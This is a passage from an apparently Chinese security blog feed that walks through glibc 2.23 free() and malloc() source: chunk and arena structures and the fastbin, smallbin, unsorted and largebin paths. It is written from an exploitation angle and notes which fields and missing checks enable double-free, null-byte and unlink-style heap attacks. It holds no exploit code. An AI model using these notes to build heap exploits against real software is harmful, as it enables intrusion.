unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">// 获得 nextchunk 的下一个 chunk, 的 pre_inused位</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 nextchunk 也是 free 状态的，合并</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="comment">// 合并的结果放置到 unsorted bin</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 防止 unsortedbin 被破坏</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 free 得到的 unsorted bin 的 size(包括合并chunk 得到的) 大于等于 FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">      systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">       large, because the corresponding heap might go away.  */</span></span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure><p>大概流程</p><ul><li>首先做了一些检查， p != top_chunk, p-&gt;size 不能越界， 限制了 next_chunk-&gt;size, p要处于 inuse状态（通过 next_chunk-&gt;pre_inused 判断）</li><li>接着判断 p 的前后相邻块是不是 free 状态，如果是就合并</li><li>根据此次拿到的 unsorted bin 的 大小，如果 size&gt;=FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</li></ul><p>如果 p 是通过 mmap 获得的，就通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munmap_chunk (p);</span><br></pre></td></tr></table></figure></p><p>释放掉他</p><h2 id="Check-In-Glbc"><a href="#Check-In-Glbc" class="headerlink" title="Check In Glbc"></a>Check In Glbc</h2><p><img alt="" data-src="/imgs/check_free.png" class="lozad"></p><p>来源 <a href="https://github.com/DhavalKapil/heap-exploitation" target="_blank" rel="noopener">https://github.com/DhavalKapil/heap-exploitation</a></p><p><a href="https://heap-exploitation.dhavalkapil.com/author.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/author.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GI-libc-free&quot;&gt;&lt;a href=&quot;#GI-libc-free&quot; class=&quot;headerlink&quot; title=&quot;_GI___libc_free&quot;&gt;&lt;/a&gt;_GI___libc_free&lt;/h2&gt;&lt;p&gt;首先是 _GI___libc_free&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>malloc源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/malloc%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/malloc源码简单分析/</id>
    <published>2020-02-26T10:29:09.000Z</published>
    <updated>2020-04-08T12:37:14.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文中未做说明 均是指 glibc 2.23</p><h2 id="简单源码分析"><a href="#简单源码分析" class="headerlink" title="简单源码分析"></a>简单源码分析</h2><p>本节只是简单跟读了一下 malloc 的源码， 说的比较简单，很多细节还是要自己拿一份源代码来读</p><h2 id="堆中的一些数据结构"><a href="#堆中的一些数据结构" class="headerlink" title="堆中的一些数据结构"></a>堆中的一些数据结构</h2><h3 id="堆管理结构"><a href="#堆管理结构" class="headerlink" title="堆管理结构"></a>堆管理结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line"> <span class="keyword">mutex_t</span> mutex;                 <span class="comment">/* Serialize access. */</span></span><br><span class="line"> <span class="keyword">int</span> flags;                       <span class="comment">/* Flags (formerly in max_fast). */</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">if</span> THREAD_STATS</span></span><br><span class="line"> <span class="comment">/* Statistics for locking. Only used if THREAD_STATS is defined. */</span></span><br><span class="line"> <span class="keyword">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> mfastbinptr fastbins[NFASTBINS];    <span class="comment">/* Fastbins */</span></span><br><span class="line"> mchunkptr top;</span><br><span class="line"> mchunkptr last_remainder;</span><br><span class="line"> mchunkptr bins[NBINS * <span class="number">2</span>];</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];   <span class="comment">/* Bitmap of bins */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>           <span class="comment">/* Linked list */</span></span><br><span class="line"> INTERNAL_SIZE_T system_mem;</span><br><span class="line"> INTERNAL_SIZE_T max_system_mem;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><ul><li>malloc_state结构是我们最常用的结构，其中的重要字段如下：</li><li>fastbins：存储多个链表。每个链表由空闲的fastbin组成，是fastbin freelist。</li><li>top ：top chunk，指向的是arena中剩下的空间。如果各种freelist都为空，则从top chunk开始分配堆块。</li><li>bins：存储多个双向链表。意义上和堆块头部的双向链表一样，并和其组成了一个双向环状空闲列表（freelist）。这里的bins位于freelist的结构上的头部，后向指针（bk）指向freelist逻辑上的第一个节点。分配chunk时从逻辑上的第一个节点分配寻找合适大小的堆块。</li></ul><h3 id="堆块结构"><a href="#堆块结构" class="headerlink" title="堆块结构"></a>堆块结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>prev_size：相邻的前一个堆块大小。这个字段只有在前一个堆块（且该堆块为normal chunk）处于释放状态时才有意义。这个字段最重要（甚至是唯一）的作用就是用于堆块释放时快速和相邻的前一个空闲堆块融合。该字段不计入当前堆块的大小计算。在前一个堆块不处于空闲状态时，数据为前一个堆块中用户写入的数据。libc这么做的原因主要是可以节约4个字节的内存空间，但为了这点空间效率导致了很多安全问题。</li><li>size：本堆块的长度。长度计算方式：size字段长度+用户申请的长度+对齐。libc以 size_T 长度<em>2 为粒度对齐。例如 32bit 以 4</em>2=8byte 对齐，64bit 以 8*2=0×10 对齐。因为最少以8字节对齐，所以size一定是8的倍数，故size字段的最后三位恒为0，libc用这三个bit做标志flag。比较关键的是最后一个bit（pre_inuse），用于指示相邻的前一个堆块是alloc还是free。如果正在使用，则 bit=1。libc判断 当前堆块是否处于free状态的方法 就是 判断下一个堆块的 pre_inuse 是否为 1 。这里也是 double free 和 null byte offset 等漏洞利用的关键。</li><li>fd &amp;bk：双向指针，用于组成一个双向空闲链表。故这两个字段只有在堆块free后才有意义。堆块在alloc状态时，这两个字段内容是用户填充的数据。两个字段可以造成内存泄漏（libc的bss地址），Dw shoot等效果。</li><li>值得一提的是，堆块根据大小，libc使用fastbin、chunk等逻辑上的结构代表，但其存储结构上都是malloc_chunk结构，只是各个字段略有区别，如fastbin相对于chunk，不使用bk这个指针，因为fastbin freelist是个单向链表。</li></ul><p>来源 <a href="https://www.freebuf.com/articles/system/91527.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/91527.html</a></p><h2 id="maclloc-源码分析"><a href="#maclloc-源码分析" class="headerlink" title="maclloc 源码分析"></a>maclloc 源码分析</h2><p>用户调用 malloc 时会先进入 __libc_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">// 如果设置了 __malloc_hook 就执行然后返回</span></span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果设置了 __malloc_hook 就执行它然后返回， 否则进入 _int_malloc 这个函数就是 malloc 的具体实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     计算出实际需要的大小，大小按照 2 * size_t 对齐， 64位： 0x10</span></span><br><span class="line"><span class="comment">     所以如个 malloc(0x28) ----&gt; nb = 0x30, 0x10 header + 0x20 当前块 + 0x8 下一块的 pre_size</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">    如果是第一次触发 malloc, 就会调用 sysmalloc---&gt; mmap 分配内存返回</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先把传入的 bytes 转换为 chunk 的实际大小，保存到 nb 里面。然后如果是第一次调用 malloc , 就会进入 sysmalloc 分配内存。</p><h3 id="搜索Fastbin"><a href="#搜索Fastbin" class="headerlink" title="搜索Fastbin"></a>搜索Fastbin</h3><p>接着会看申请的 nb 是不是在 fastbin 里面，如果是进入 fastbin 的处理流程<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);  <span class="comment">// 找到nb 对应的 fastbin 的 索引 idx</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">// 找到对应的 fastbin 的指针</span></span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>) <span class="comment">//如果 fastbin 非空，就进入这里</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">// 判断大小是否满足 fastbin相应bin的大小要求</span></span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>首先根据 nb 找到该大小对应的 fastbin 的项， 然后看看该 fastbin 是不是为空，如果非空，就分配该 fastbin 的第一个 chunk 给用户。<br>分配过程还会检查待分配的 chunk 的 size 是不是满足在该 fastbin 项的限制。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index (chunksize (victim)) != idx</span><br></pre></td></tr></table></figure></p><h3 id="搜索Smallbin"><a href="#搜索Smallbin" class="headerlink" title="搜索Smallbin"></a>搜索Smallbin</h3><p>如果 fastbin 为空或者 nb 不在 fastbin 里面，就会进入 smallbin 和 largebin 的处理逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);<span class="comment">//  找到 smallbin 索引</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">// 判断 bin 中是不是有 chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 链表检查</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb); <span class="comment">//设置下一个chunk的 in_use 位</span></span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     大内存分配，进入 malloc_consolidate</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果申请的 nb 位于 smallbin 的范围，就会 fastbin 一样去找对应的项，然后判断 bin 是不是为空，如果不空, 分配第一个 chunk 给用户，分配之前还会校验该 chunk 是不是正确的。如果为空，就会进入 unsorted bin 的处理了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__glibc_unlikely (bck-&gt;fd != victim)</span><br></pre></td></tr></table></figure><p>如果 nb 不满足 smallbin ，就会触发 malloc_consolidate . 然后进入 unsorted bin</p><h3 id="搜索Unsorted-bin"><a href="#搜索Unsorted-bin" class="headerlink" title="搜索Unsorted bin"></a>搜索Unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">// 遍历 unsorted bin</span></span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">             bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">             victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">             (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             remainder = chunk_at_offset (victim, nb);</span><br><span class="line">             unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">             av-&gt;last_remainder = remainder;</span><br><span class="line">             remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">             <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">               &#123;</span><br><span class="line">                 remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">             set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">             set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">             set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>遍历 unsorted bin ， 如果此时的 unsorted bin 只有一项，且他就是 av-&gt;last_remainder ,同时大小满足</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)</span><br></pre></td></tr></table></figure><p>就对当前 unsorted bin 进行切割，然后返回切割后的 unsorted bin 。</p><p>否则就先把该 unsorted bin 从 unsorted list 中移除下来，这里用了一个 类似 unlink 的操作，不过没有检查 chunk 的指针<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*先摘下该 unsorted bin  */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 如果申请的大小和该 unsorted bin的大小刚好相等，就直接返回</span></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>如果申请的大小和该 unsorted bin 的大小刚好相等，就直接返回， 否则就把它放到相应的 bin 里面去。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">              .......</span><br><span class="line">              .......</span><br></pre></td></tr></table></figure></p><h3 id="搜索-Largebin"><a href="#搜索-Largebin" class="headerlink" title="搜索 Largebin"></a>搜索 Largebin</h3><p>接下来就会去搜索 largebin 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 